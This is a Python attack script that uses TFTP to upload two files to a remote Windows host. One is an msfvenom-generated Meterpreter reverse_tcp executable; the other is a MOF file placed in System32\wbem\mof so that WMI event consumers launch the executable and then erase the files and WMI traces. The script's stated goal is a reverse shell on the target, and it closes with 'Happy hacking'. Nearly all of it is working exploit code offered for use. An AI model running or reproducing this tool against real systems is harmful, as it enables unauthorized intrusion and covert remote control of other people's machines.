import argparse
import tftpy
import sys
import os
import string
import random

mof_skeleton = """#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
class MyClass4387
{
  	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
 	[key] string Name;
  	[not_null] string ScriptingEngine;
  	string ScriptFileName;
  	[template] string ScriptText;
  uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
    Name  = "ActiveScriptEventConsumer";
    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
    PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
  Provider = $P;
  ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"###EXE###\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass4387\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";

};
Instance of ActiveScriptEventConsumer as $cons2
{
  Name = "qndASEC";
  ScriptingEngine = "JScript";
  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\IlnzAd.mof\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"###EXE###\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass4387\\"";
  QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
  Name = "qndfilt";
  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"###EXE###\\"";
  QueryLanguage = "WQL";

};
instance of __FilterToConsumerBinding as $bind
{
  Consumer = $cons;
  Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
  Consumer = $cons2;
  Filter = $Filt2;
};
instance of MyClass4387 as $MyClass
{
  Name = "ClassConsumer";
};
"""


def random_string_generator(size=8, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))


def main():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('--rhost', help='the remote host', required=True)
    parser.add_argument('--rport', help='the remote tftp port', default=69)
    parser.add_argument('--lhost', help='the local host', required=True)
    parser.add_argument('--lport', help='the local port to listen on for incoming reverse shell', default=4444)
    parser.add_argument('--exe_rfile',
                        help='the path on the remote host where the exe file (msf payload) should be uploaded to',
                        default='/Windows/System32/')
    parser.add_argument('--mof_rfile', help='the path on the remote host where the mof file should be uploaded to',
                        default='/Windows/System32/wbem/mof/')
    parser.add_argument('--msf_payload', help='the msf payload to use', default='windows/meterpreter/reverse_tcp')
    args = parser.parse_args()

    exe_name = random_string_generator() + '.exe'
    mof_name = random_string_generator() + '.mof'

    print('\t[+] Generating {}'.format(exe_name))
    msfvenom_command = 'msfvenom -p {} LHOST={} LPORT={} -f exe -o {}'.format(args.msf_payload, args.lhost, args.lport, '/tmp/{}'.format(exe_name))
    print('\t[+] Running {}'.format(msfvenom_command))
    os.system(msfvenom_command)
    exe_lfile_path = '/tmp/{}'.format(exe_name)
    if os.path.exists(exe_lfile_path):
        print('\t[+] Payload written to {}'.format(exe_lfile_path))
    else:
        print('\t[+] An error occured while writing the payload. Exiting...')
        sys.exit(1)

    print('\t[+] Generating {}'.format(mof_name))
    mof_filled = mof_skeleton.replace('###EXE###', exe_name)
    mof_lfile_path = '/tmp/{}'.format(mof_name)
    try:
        with open(mof_lfile_path, 'w') as mof_file:
            mof_file.write(mof_filled)
    except IOError as e:
        print('\t[+] An error occured while writing the mof file. Printing exception and exiting...')
        print(e)
        sys.exit(1)

    client = tftpy.TftpClient(args.rhost, args.rport)
    print('\t[+] Uploading {} to {} on {}:{}'.format(exe_lfile_path, args.exe_rfile + exe_name, args.rhost, args.rport))
    client.upload(args.exe_rfile + exe_name, exe_lfile_path)
    print('\t[+] Uploading {} to {} on {}:{}'.format(mof_lfile_path, args.mof_rfile + mof_name, args.rhost, args.rport))
    client.upload(args.mof_rfile + mof_name, mof_lfile_path)

    print('\t[+] Script finished successfully. You should have a reverse shell by now. Happy hacking :)')
    sys.exit(0)


if __name__ == "__main__":
    main()
